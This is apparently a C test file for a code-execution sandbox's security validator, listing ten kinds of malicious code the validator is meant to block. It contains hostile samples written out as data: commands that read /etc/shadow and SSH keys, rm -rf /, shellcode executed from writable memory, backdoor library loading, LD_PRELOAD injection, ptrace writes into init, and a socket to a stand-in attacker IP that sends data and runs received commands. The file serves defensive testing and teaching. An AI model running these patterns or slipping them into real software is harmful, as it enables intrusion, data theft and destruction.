/*
 * Security Validation Examples
 * ============================
 * 
 * This file contains examples of DANGEROUS C code that will be BLOCKED
 * by the rUv-swarm sandbox security system. These examples demonstrate
 * the types of malicious code patterns that the sandbox prevents.
 * 
 * ⚠️  WARNING: These code examples are for EDUCATIONAL PURPOSES ONLY
 * ⚠️  They demonstrate attack vectors that are automatically blocked
 * ⚠️  DO NOT attempt to execute malicious code in production systems
 * 
 * Security Analyst: Claude Code
 * Generated for rUv-swarm-course security validation
 */

// ============================================================================
// BLOCKED EXAMPLE 1: System Command Injection
// ============================================================================

/*
 * This code attempts to execute system commands, which could be used
 * to compromise the host system. The sandbox blocks all system() calls.
 * 
 * SECURITY RISK: Command injection, arbitrary code execution
 * BLOCKED BY: Pattern matching for system() calls
 */
#include <stdio.h>
#include <stdlib.h>

int system_injection_example() {
    printf("Attempting system command injection...\n");
    
    // These calls will be BLOCKED by security validation
    system("whoami");                    // Identity disclosure
    system("cat /etc/passwd");          // Password file access
    system("ls -la /");                 // File system enumeration
    system("ps aux");                   // Process enumeration
    system("netstat -an");              // Network reconnaissance
    system("uname -a");                 // System information gathering
    system("id");                       // User privilege enumeration
    system("/bin/sh");                  // Shell access
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 2: Process Creation and Manipulation
// ============================================================================

/*
 * These functions attempt to create new processes or manipulate existing
 * ones, which could be used for privilege escalation or system compromise.
 * 
 * SECURITY RISK: Process injection, privilege escalation, fork bombs
 * BLOCKED BY: Pattern matching for process creation functions
 */
#include <unistd.h>  // This header itself will be BLOCKED
#include <sys/wait.h>

int process_manipulation_example() {
    printf("Attempting process manipulation...\n");
    
    // Fork-based attacks (BLOCKED)
    pid_t pid = fork();              // Fork bomb creation
    if (pid == 0) {
        // Child process code
        execl("/bin/sh", "sh", NULL);  // Shell execution
        execlp("rm", "rm", "-rf", "/", NULL);  // System destruction
    } else {
        // Parent process
        vfork();                     // Another process creation
        wait(NULL);                  // Process synchronization
    }
    
    // Exec family attacks (BLOCKED)
    execv("/bin/bash", NULL);        // Shell execution
    execve("/usr/bin/id", NULL, NULL);  // Command execution
    execvp("ls", NULL);              // Directory listing
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 3: File System Attacks
// ============================================================================

/*
 * These examples attempt to access sensitive system files or perform
 * path traversal attacks to escape the sandbox.
 * 
 * SECURITY RISK: Information disclosure, path traversal, file system escape
 * BLOCKED BY: Path validation and string literal scanning
 */
#include <stdio.h>

int filesystem_attack_example() {
    printf("Attempting file system attacks...\n");
    
    FILE *fp;
    
    // System file access attempts (BLOCKED)
    fp = fopen("/etc/passwd", "r");        // Password file
    fp = fopen("/etc/shadow", "r");        // Shadow password file
    fp = fopen("/proc/version", "r");      // System version info
    fp = fopen("/proc/meminfo", "r");      // Memory information
    fp = fopen("/sys/kernel/hostname", "r"); // System hostname
    fp = fopen("/dev/random", "r");        // Device access
    fp = fopen("/root/.ssh/id_rsa", "r");  // SSH private keys
    
    // Path traversal attempts (BLOCKED)
    fp = fopen("../../../etc/passwd", "r");     // Directory traversal
    fp = fopen("../../../../etc/shadow", "r");   // Deep traversal
    fp = fopen("..\\..\\..\\windows\\system32\\config\\sam", "r"); // Windows traversal
    
    // Hidden file access (BLOCKED)
    fp = fopen("/tmp/.hidden_backdoor", "w");   // Hidden backdoor
    fp = fopen("/var/log/auth.log", "r");       // Authentication logs
    fp = fopen("/home/user/.bash_history", "r"); // Command history
    
    if (fp) {
        printf("File access successful (THIS SHOULD NOT HAPPEN!)\n");
        fclose(fp);
    }
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 4: Inline Assembly and Low-Level Access
// ============================================================================

/*
 * These examples attempt to use inline assembly or low-level system access
 * to bypass security controls or perform privileged operations.
 * 
 * SECURITY RISK: Arbitrary code execution, privilege escalation, rootkits
 * BLOCKED BY: Assembly pattern detection
 */
#include <stdio.h>

int assembly_attack_example() {
    printf("Attempting inline assembly attacks...\n");
    
    // Inline assembly attempts (BLOCKED)
    __asm__("mov $1, %eax");           // System call preparation
    __asm__("int $0x80");              // Software interrupt
    __asm__ volatile ("nop");          // No-operation (still blocked)
    asm("jmp *%eax");                  // Jump to register
    
    // Shellcode injection patterns (BLOCKED)
    __asm__(
        "xor %eax, %eax\n\t"          // Zero register
        "mov $11, %eax\n\t"           // execve system call
        "int $0x80"                   // Execute system call
    );
    
    // Register manipulation (BLOCKED)
    __asm__("push %ebp");              // Stack manipulation
    __asm__("pop %ebp");               // Stack restoration
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 5: Memory Manipulation and Buffer Overflows
// ============================================================================

/*
 * These examples attempt dangerous memory operations that could lead to
 * buffer overflows, arbitrary code execution, or memory corruption.
 * 
 * SECURITY RISK: Buffer overflow, arbitrary write, code injection
 * BLOCKED BY: Memory mapping detection and size limits
 */
#include <stdio.h>
#include <sys/mman.h>  // This header will be BLOCKED
#include <string.h>

int memory_attack_example() {
    printf("Attempting memory manipulation attacks...\n");
    
    // Memory mapping attacks (BLOCKED)
    void *mapped = mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, 
                       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    
    if (mapped != MAP_FAILED) {
        // Attempt to write shellcode to executable memory
        unsigned char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68";
        memcpy(mapped, shellcode, sizeof(shellcode));
        
        // Attempt to execute shellcode
        void (*shell)() = (void(*)())mapped;
        shell();  // Execute injected code
        
        munmap(mapped, 4096);
    }
    
    // Buffer overflow attempts
    char buffer[64];
    char overflow_data[1024];
    memset(overflow_data, 'A', sizeof(overflow_data));
    strcpy(buffer, overflow_data);  // Classic buffer overflow
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 6: Dynamic Library Loading and Code Injection
// ============================================================================

/*
 * These examples attempt to load dynamic libraries or inject code at runtime
 * to bypass security controls or execute malicious code.
 * 
 * SECURITY RISK: DLL injection, runtime code modification, backdoor loading
 * BLOCKED BY: Dynamic linking header detection and dlopen() blocking
 */
#include <stdio.h>
#include <dlfcn.h>  // This header will be BLOCKED

int dynamic_loading_example() {
    printf("Attempting dynamic library attacks...\n");
    
    // Dynamic library loading (BLOCKED)
    void *handle = dlopen("libc.so.6", RTLD_LAZY);    // Load libc
    void *evil_lib = dlopen("/tmp/backdoor.so", RTLD_NOW);  // Load backdoor
    
    if (handle) {
        // Attempt to get function pointers
        void (*system_ptr)(const char*) = dlsym(handle, "system");
        int (*execve_ptr)(const char*, char* const[], char* const[]) = 
            dlsym(handle, "execve");
        
        if (system_ptr) {
            system_ptr("whoami");  // Execute via function pointer
        }
        
        dlclose(handle);
    }
    
    // LD_PRELOAD manipulation (BLOCKED by string detection)
    printf("LD_PRELOAD=/tmp/evil.so\n");  // Environment manipulation
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 7: Network Communication and Data Exfiltration
// ============================================================================

/*
 * These examples attempt to establish network connections for data exfiltration
 * or to receive commands from external attackers.
 * 
 * SECURITY RISK: Data exfiltration, command and control, backdoor communication
 * BLOCKED BY: Network header detection and container network isolation
 */
#include <stdio.h>
#include <sys/socket.h>  // This header will be BLOCKED
#include <netinet/in.h>  // This header will be BLOCKED
#include <arpa/inet.h>   // This header will be BLOCKED

int network_attack_example() {
    printf("Attempting network communication...\n");
    
    // Socket creation (BLOCKED)
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    
    if (sock >= 0) {
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(4444);  // Common backdoor port
        server.sin_addr.s_addr = inet_addr("192.168.1.100");  // Attacker IP
        
        // Connect to external server (BLOCKED)
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) >= 0) {
            // Send sensitive data
            send(sock, "/etc/passwd contents", 20, 0);
            
            // Receive commands
            char command[256];
            recv(sock, command, sizeof(command), 0);
            system(command);  // Execute received command
        }
        
        close(sock);
    }
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 8: Process Tracing and Debugging Attacks
// ============================================================================

/*
 * These examples attempt to use debugging and tracing facilities to inject
 * code into other processes or bypass security controls.
 * 
 * SECURITY RISK: Process injection, debugging bypass, rootkit installation
 * BLOCKED BY: ptrace header detection and system call filtering
 */
#include <stdio.h>
#include <sys/ptrace.h>  // This header will be BLOCKED
#include <sys/wait.h>

int ptrace_attack_example() {
    printf("Attempting process tracing attacks...\n");
    
    pid_t target_pid = 1;  // Target process (init)
    
    // Attach to process (BLOCKED)
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == 0) {
        printf("Attached to process %d\n", target_pid);
        
        // Wait for process to stop
        int status;
        waitpid(target_pid, &status, 0);
        
        // Read process memory (BLOCKED)
        long data = ptrace(PTRACE_PEEKTEXT, target_pid, 0x400000, NULL);
        
        // Write to process memory (BLOCKED)
        ptrace(PTRACE_POKETEXT, target_pid, 0x400000, 0x41414141);
        
        // Continue execution (BLOCKED)
        ptrace(PTRACE_CONT, target_pid, NULL, NULL);
        
        // Detach from process (BLOCKED)
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
    }
    
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 9: Constructor Attribute Attacks
// ============================================================================

/*
 * These examples use GCC constructor attributes to execute code before main()
 * runs, potentially bypassing security checks or initialization code.
 * 
 * SECURITY RISK: Early execution, security bypass, persistent infection
 * BLOCKED BY: Constructor attribute pattern detection
 */
#include <stdio.h>

// Constructor functions (BLOCKED)
__attribute__((constructor))
void evil_constructor() {
    printf("This runs before main() - BLOCKED!\n");
    system("echo 'Constructor executed'");  // Also blocked by system() filter
}

__attribute__((constructor(101)))  // Priority constructor
void priority_constructor() {
    printf("High priority constructor - BLOCKED!\n");
}

__attribute__((destructor))
void evil_destructor() {
    printf("This runs after main() - BLOCKED!\n");
    system("rm -rf /tmp/*");  // Cleanup attack
}

int constructor_attack_example() {
    printf("Main function executing...\n");
    return 0;
}

// ============================================================================
// BLOCKED EXAMPLE 10: Environment Variable Manipulation
// ============================================================================

/*
 * These examples attempt to manipulate environment variables to change
 * program behavior or bypass security controls.
 * 
 * SECURITY RISK: PATH manipulation, library injection, privilege escalation
 * BLOCKED BY: Dangerous string literal detection
 */
#include <stdio.h>
#include <stdlib.h>

int environment_attack_example() {
    printf("Attempting environment manipulation...\n");
    
    // Environment variable attacks (BLOCKED by string detection)
    printf("PATH=/tmp:/usr/bin:/bin\n");           // PATH manipulation
    printf("LD_LIBRARY_PATH=/tmp/evil\n");         // Library path injection
    printf("LD_PRELOAD=/tmp/rootkit.so\n");        // Preload injection
    printf("HOME=/tmp/fakehome\n");                // Home directory spoofing
    printf("SHELL=/tmp/evil_shell\n");             // Shell replacement
    
    // Attempt to set environment variables
    setenv("PATH", "/tmp:/usr/bin", 1);            // Direct manipulation
    setenv("LD_PRELOAD", "/tmp/evil.so", 1);       // Preload attack
    
    return 0;
}

// ============================================================================
// Main Function - This Will Never Execute Due to Security Blocks
// ============================================================================

int main() {
    printf("🚨 SECURITY VIOLATION DETECTED! 🚨\n");
    printf("=====================================\n");
    printf("This code contains multiple security violations:\n\n");
    
    printf("❌ System command injection attempts\n");
    printf("❌ Process creation and manipulation\n");
    printf("❌ File system attack patterns\n");
    printf("❌ Inline assembly code injection\n");
    printf("❌ Memory manipulation attacks\n");
    printf("❌ Dynamic library loading exploits\n");
    printf("❌ Network communication attempts\n");
    printf("❌ Process tracing and debugging\n");
    printf("❌ Constructor attribute abuse\n");
    printf("❌ Environment variable manipulation\n");
    
    printf("\n🛡️  rUv-swarm Sandbox Protection:\n");
    printf("✅ All dangerous patterns BLOCKED at validation stage\n");
    printf("✅ No malicious code will execute\n");
    printf("✅ Container isolation prevents host access\n");
    printf("✅ Security logging captures all attempts\n");
    
    printf("\n📚 Educational Value:\n");
    printf("This demonstrates the types of attacks the sandbox prevents.\n");
    printf("Real-world malware often combines multiple techniques.\n");
    printf("The sandbox provides comprehensive protection against:\n");
    printf("• Code injection attacks\n");
    printf("• Privilege escalation attempts\n");
    printf("• Data exfiltration efforts\n");
    printf("• System compromise techniques\n");
    
    // None of these function calls will execute due to security blocks
    system_injection_example();
    process_manipulation_example();
    filesystem_attack_example();
    assembly_attack_example();
    memory_attack_example();
    dynamic_loading_example();
    network_attack_example();
    ptrace_attack_example();
    constructor_attack_example();
    environment_attack_example();
    
    return 0;
}